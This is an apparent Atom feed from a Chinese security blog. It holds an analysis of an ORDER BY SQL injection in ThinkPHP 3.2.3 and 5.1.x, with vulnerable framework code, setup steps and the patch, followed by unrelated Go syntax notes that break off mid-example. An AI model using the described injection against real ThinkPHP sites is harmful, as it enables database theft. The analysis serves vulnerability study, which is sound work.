<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wywwzjj&#39;s Blog</title>
  
  <subtitle>爱学习，爱分享，爱生活</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://wywwzjj.top/"/>
  <updated>2020-01-31T02:46:40.786Z</updated>
  <id>https://wywwzjj.top/</id>
  
  <author>
    <name>wywwzjj</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ThinkPHP 3.x / 5.x order by 注入</title>
    <link href="https://wywwzjj.top/2020/01/30/ThinkPHP-3.x-5.x-order-by-%E6%B3%A8%E5%85%A5/"/>
    <id>https://wywwzjj.top/2020/01/30/ThinkPHP-3.x-5.x-order-by-注入/</id>
    <published>2020-01-30T04:42:30.000Z</published>
    <updated>2020-01-31T02:46:40.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在 ThinkPHP 5.1.23 之前的版本中存在 SQL 注入漏洞，该漏洞是由于程序在处理 order by 后的参数时，未正确过滤处理数组的 key 值所造成。如果该参数用户可控，且当传递的数据为数组时，会导致漏洞的产生。</p><p>ThinkPHP 5.1 中的更新日志也可看到：V5.1.23（2018-8-23）改进<code>order</code>方法的数组方式解析，增强安全性。</p><p>同时受到影响的还有 3.2.3 及以下的版本。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.22 thinkphp5.1.22</span><br></pre></td></tr></table></figure><p>ThinkPHP 3.2.3 版本环境建议按官方文档操作，直接下载： <a href="https://www.kancloud.cn/manual/thinkphp/1680" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp/1680</a></p><p>配好数据库后，在 index.php 中加入测试代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $order = input(<span class="string">'order'</span>);</span><br><span class="line">        $res = db(<span class="string">'user'</span>)-&gt;order($order)-&gt;find();</span><br><span class="line">        dump($res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user 是随便创建的表，看到该页面说明环境没问题。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbei8tc4eoj20d403j747.jpg" alt="image.png"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbeiakca6jj20x804k3yv.jpg" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="TP-5-1-x"><a href="#TP-5-1-x" class="headerlink" title="TP 5.1.x"></a>TP 5.1.x</h3><p>我们先来看一下正常的 SQL 查询流程。</p><p>ThinkPHP 提供了大量封装数据库操作的函数给开发者使用，但终究是要落实到生成 SQL 语句的。</p><p>Builder.php 中可看到这些实现细节，以 select 查询为例，TP 弄了一个查询模板，每次查询时替换成具体的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $selectSql = <span class="string">'SELECT%DISTINCT% %FIELD% FROM %TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%UNION%%ORDER%%LIMIT% %LOCK%%COMMENT%'</span>;</span><br></pre></td></tr></table></figure><p>select 语句替换操作，在这里生成 SQL 语句。既然 <code>parseOrder()</code> 有注入，其他的同样可能出现问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">(Query $query)</span> </span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">'%TABLE%'</span>, <span class="string">'%DISTINCT%'</span>, <span class="string">'%FIELD%'</span>, <span class="string">'%JOIN%'</span>, <span class="string">'%WHERE%'</span>, <span class="string">'%GROUP%'</span>, <span class="string">'%HAVING%'</span>, <span class="string">'%ORDER%'</span>, <span class="string">'%LIMIT%'</span>, <span class="string">'%UNION%'</span>, <span class="string">'%LOCK%'</span>, <span class="string">'%COMMENT%'</span>, <span class="string">'%FORCE%'</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">'table'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">'distinct'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">'field'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">'join'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">'where'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">'group'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">'having'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">'order'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">'limit'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">'union'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">'lock'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">'comment'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">'force'</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终在 Connection.php 中用 PDO 执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;PDOStatement = <span class="keyword">$this</span>-&gt;linkID-&gt;prepare($sql);</span><br><span class="line"><span class="keyword">$this</span>-&gt;PDOStatement-&gt;execute();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getResult($pdo, $procedure);</span><br></pre></td></tr></table></figure><p>回到本文的重点，order by 处理，可看到 <code>order by</code> 与 <code>$array</code> 拼接一下就返回了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span><span class="params">(Query $query, $order)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            <span class="comment">// 有些分析是从这进去的，没这个必要，反而使 payload 复杂化</span></span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">'[rand]'</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">' '</span>, strpos($val, <span class="string">' '</span>) ? $val : $val . <span class="string">' '</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">'ASC'</span>, <span class="string">'DESC'</span>], <span class="keyword">true</span>) ? <span class="string">' '</span> . $sort : <span class="string">''</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="keyword">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">' ORDER BY '</span> . implode(<span class="string">','</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 $val 非 ASC、DESC，将被直接清空。继续跟进 <code>parseKey()</code>，这个方法会随使用的数据库驱动类型变化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mysql.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span><span class="params">(Query $query, $key, $strict = false)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $key;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($key <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">        <span class="keyword">return</span> $key-&gt;getValue();</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    $key = trim($key);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 处理 json 字段和 table_name.filed 这种形式</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'*'</span> != $key &amp;&amp; ($strict || !preg_match(<span class="string">'/[,\'\"\*\(\)`.\s]/'</span>, $key))) &#123;</span><br><span class="line">        $key = <span class="string">'`'</span> . $key . <span class="string">'`'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来说，经过这一步操作，由于$strict = true，$key 将被包一层反引号。</p><p>现在的问题就变成了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> xxx <span class="keyword">from</span> xxx <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">`$key`</span> <span class="keyword">limit</span> <span class="number">1</span>;  <span class="comment">-- limit 1 是自动拼接上的</span></span><br></pre></td></tr></table></figure><p>联合注入时，经常使用 <code>order by 4</code> 来判断字段数，当 4 被反引号包裹时还能起到同样的效果吗？没了。</p><p>也就是说至少得知道一个字段名，否则 order by 这里就会报错了。不能堆叠注入，待继续突破！</p><p>看下 V5.1.23 的补丁，order by 后的 <code>)</code> 没了，还能继续绕吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === strpos($key, <span class="string">')'</span>) &amp;&amp; <span class="keyword">false</span> === strpos($key, <span class="string">'#'</span>)) &#123;</span><br><span class="line">    $sort    = strtoupper($sort);</span><br><span class="line">    $sort    = in_array($sort, [<span class="string">'ASC'</span>, <span class="string">'DESC'</span>], <span class="keyword">true</span>) ? <span class="string">' '</span> . $sort : <span class="string">''</span>;</span><br><span class="line">    $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="keyword">true</span>) . $sort;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TP-3-2-3"><a href="#TP-3-2-3" class="headerlink" title="TP 3.2.3"></a>TP 3.2.3</h3><p>这个版本就更简单了，相比 5 系列，连反引号都没有了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Driver.class.php</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span><span class="params">($order)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($order)) &#123;</span><br><span class="line">        $array = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($val);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($key) . <span class="string">' '</span> . $val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $order = implode(<span class="string">','</span>, $array);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>($order) ? <span class="string">' ORDER BY '</span> . $order : <span class="string">''</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组成的 SQL 语句是这样的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> xxx <span class="keyword">from</span> xxx <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">order</span> <span class="keyword">limit</span> <span class="number">1</span>;  <span class="comment">-- limit 1 是自动拼接上的</span></span><br></pre></td></tr></table></figure><p>拿出 order by 的常规套路即可，有报错就报错注入，没报错就盲注。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>TP 3 这个注入还是挺实用的，TP 5 还需要继续研究下，如果不能获取到列名，很难利用。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;在 ThinkPHP 5.1.23 之前的版本中存在 SQL 注入漏洞，该漏洞是由于程序在处理 order by 后的参数时，未正确过滤处理
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://wywwzjj.top/tags/PHP/"/>
    
      <category term="ThinkPHP" scheme="https://wywwzjj.top/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>Go 学习</title>
    <link href="https://wywwzjj.top/2020/01/24/Go-%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wywwzjj.top/2020/01/24/Go-学习/</id>
    <published>2020-01-24T04:12:07.000Z</published>
    <updated>2020-02-01T01:08:06.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="为什么要学-Go？"><a href="#为什么要学-Go？" class="headerlink" title="为什么要学 Go？"></a>为什么要学 Go？</h2><blockquote><p>以下引用自左耳听风专栏。</p></blockquote><p>第一，<strong>语言简单，上手快</strong>。Go 语言的语法特性简直是太简单了，简单到你几乎玩不出什么花招，直来直去的，学习难度很低，容易上手。</p><p>第二，<strong>并行和异步编程几乎无痛点</strong>。Go 语言的 Goroutine 和 Channel 这两个神器简直就是并发和异步编程的巨大福音。像 C、C++、Java、Python 和 JavaScript 这些语言的并发和异步的编程方式控制起来就比较复杂了，并且容易出错，但 Go 语言却用非常优雅和流畅的方式解决了这个问题。这对于编程多年受尽并发和异步折磨的我来说，完全就是眼前一亮的感觉。</p><p><img src="https://static001.geekbang.org/resource/image/8d/5f/8df5fd56cbb6343a9030265a5f3a565f.png" alt="img"></p><p>（图片来自 Medium：Why should you learn Go?）</p><p>第三，<strong>Go 语言的 lib 库 “麻雀虽小，五脏俱全”</strong>。Go 语言的 lib 库中基本上有绝大多数常用的库，虽然有些库还不是很好，但我觉得这都不是主要问题，因为随着技术的发展和成熟，这些问题肯定也都会随之解决。</p><p>第四，<strong>C 语言的理念和 Python 的姿态</strong>。C 语言的理念是信任程序员，保持语言的小巧，不屏蔽底层且对底层友好，关注语言的执行效率和性能。而 Python 的姿态是用尽量少的代码完成尽量多的事。于是我能够感觉到，Go 语言是想要把 C 和 Python 统一起来，这是多棒的一件事。</p><p><img src="https://static001.geekbang.org/resource/image/03/f7/03ea333bf7b7bb2fe350c4f433047df7.png" alt="img"></p><p>（图片来自 Medium：Why should you learn Go?）</p><p>所以，即便 Go 语言存在诸多的问题，比如垃圾回收、异常处理、泛型编程等，但相较于上面这几个优势，我认为这些问题都是些小问题。于是就毫不犹豫地入坑了。</p><h3 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h3><p>首首推，通过 TDD 学习 Go <a href="https://studygolang.gitbook.io/learn-go-with-tests/" target="_blank" rel="noopener">https://studygolang.gitbook.io/learn-go-with-tests/</a></p><p>首推 <a href="https://gobyexample.com/" target="_blank" rel="noopener">Go by Example</a> 作为你的入门教程。然后，<a href="https://go101.org/article/101.html" target="_blank" rel="noopener">Go 101</a> 也是一个很不错的在线电子书。如果你想看纸书的话，<a href="https://book.douban.com/subject/26337545/" target="_blank" rel="noopener">The Go Programming Language</a> 一书在豆瓣上有 9.2 分，但是国内没有卖的。（当然，我以前也写过两篇入门的供你参考 “<a href="https://coolshell.cn/articles/8460.html" target="_blank" rel="noopener">GO 语言简介（上）- 语法 </a>” 和 “<a href="https://coolshell.cn/articles/8489.html" target="_blank" rel="noopener">GO 语言简介（下）- 特性</a>”）。</p><p>另外，Go 语言官方的 <a href="https://golang.org/doc/effective_go.html" target="_blank" rel="noopener">Effective Go</a> 是必读的，这篇文章告诉你如何更好地使用 Go 语言，以及 Go 语言中的一些原理。</p><p>Go 语言最突出之处是并发编程，Unix 老牌黑客罗勃・派克（Rob Pike）在 Google I/O 上的两个分享，可以让你学习到一些并发编程的模式。</p><ul><li>Go Concurrency Patterns（ <a href="https://talks.golang.org/2012/concurrency.slide" target="_blank" rel="noopener">幻灯片</a>和<a href="https://www.youtube.com/watch?v=f6kdp27TYZs" target="_blank" rel="noopener">演讲视频</a>）。</li><li>Advanced Go Concurrency Patterns（<a href="https://talks.golang.org/2013/advconc.slide" target="_blank" rel="noopener">幻灯片</a>、<a href="https://youtu.be/QDDwwePbDtw" target="_blank" rel="noopener">演讲视频</a>）。</li></ul><p>然后，Go 在 GitHub 的 wiki 上有好多不错的学习资源，你可以从中学习到多。比如：</p><ul><li><a href="https://github.com/golang/go/wiki/Articles" target="_blank" rel="noopener">Go 精华文章列表</a>。</li><li><a href="https://github.com/golang/go/wiki/Blogs" target="_blank" rel="noopener">Go 相关博客列表</a>。</li><li><a href="https://github.com/golang/go/wiki/GoTalks" target="_blank" rel="noopener">Go Talks</a>。</li></ul><p>此外，还有个内容丰富的 Go 资源列表 <a href="https://github.com/avelino/awesome-go" target="_blank" rel="noopener">Awesome Go</a>，推荐看看。</p><p>类似 awesome-go <a href="https://github.com/hackstoic/golang-open-source-projects" target="_blank" rel="noopener">https://github.com/hackstoic/golang-open-source-projects</a></p><p>Go roadmap <a href="https://github.com/Alikhll/golang-developer-roadmap" target="_blank" rel="noopener">https://github.com/Alikhll/golang-developer-roadmap</a></p><p><a href="http://tmrts.com/go-patterns/" target="_blank" rel="noopener">http://tmrts.com/go-patterns/</a></p><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>每个类型都有默认的初值，比如 0，“”，false</p><p>定义的变量必须要用到，实在不用的可以用 “_”</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a, b, c <span class="keyword">int</span> = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a, b, c = <span class="number">1</span>, <span class="string">'a'</span>, <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    home = os.Getenv(<span class="string">"HOME"</span>)</span><br><span class="line">    user = os.Getenv(<span class="string">"USER"</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">a, b, c := <span class="number">1</span>, <span class="string">'a'</span>, <span class="literal">false</span>  <span class="comment">// 只能在函数内使用</span></span><br></pre></td></tr></table></figure><h3 id="内建变量类型"><a href="#内建变量类型" class="headerlink" title="内建变量类型"></a>内建变量类型</h3><blockquote><p>必须显式强制类型转换</p></blockquote><p>布尔：bool</p><p>整型：int、(u)int8、(u)int16、(u)int32、(u)int64、uintptr</p><p>浮点：float32、float64、原生复数：complex64、complex128</p><p>字符串：string</p><p>字符：rune（类似 int32）</p><p>byte：类似 uint8</p><p><strong>派生：</strong></p><ul><li>结构体 struct</li><li>channel</li><li>func</li><li>slice</li><li>interface</li><li>map</li></ul><p>可用 type 设置别名</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> S <span class="keyword">string</span></span><br></pre></td></tr></table></figure><h3 id="new-与-make"><a href="#new-与-make" class="headerlink" title="new 与 make"></a>new 与 make</h3><p>Go 提供了两种分配原语，即 new 和 make。</p><p>new 是分配一个内存，返回一个内存地址，它不会初始化内存，只会将内存置零。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> SyncedBuffer <span class="keyword">struct</span> &#123;</span><br><span class="line">    lock sync.Mutex</span><br><span class="line">    buffer bytes.Buffer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p := <span class="built_in">new</span>(SyncedBuffer)  <span class="comment">// type *SyncedBuffer</span></span><br></pre></td></tr></table></figure><p>make 只用于创建 slice、map 和 channel，并返回一个“已初始化”的值。</p><h3 id="常量与枚举"><a href="#常量与枚举" class="headerlink" title="常量与枚举"></a>常量与枚举</h3><p>未指定类型的常量类似替换，不需要关心类型转换</p><p>Go 里的大写有其他含义，常量不再大写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> b <span class="keyword">string</span> = <span class="string">"string"</span>  <span class="comment">// 指定后需要显式类型转换</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="string">"string"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 枚举</span></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    c = <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line">cpp = ioat</span><br><span class="line">    python</span><br><span class="line">    java</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line">    _ = <span class="literal">iota</span>  <span class="comment">// 通过赋予空白标识符来忽略第一个值</span></span><br><span class="line">    b = <span class="number">1</span> &lt;&lt; (<span class="number">10</span> * <span class="literal">iota</span>)</span><br><span class="line">    kb</span><br><span class="line">    mb</span><br><span class="line">    gb</span><br><span class="line">    tb</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> contents, err := ioutil.ReadFile(filename); err != <span class="literal">nil</span> &#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认添加了 break，不 break 需指定</span></span><br><span class="line"><span class="keyword">switch</span> i &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>:</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g := <span class="string">""</span></span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> g:</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">whatAmI := <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> t := i.(<span class="keyword">type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">bool</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">int</span>:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">whatAmI(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">i := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i &lt;= <span class="number">3</span> &#123;</span><br><span class="line">    fmt.Println(i)</span><br><span class="line">    i 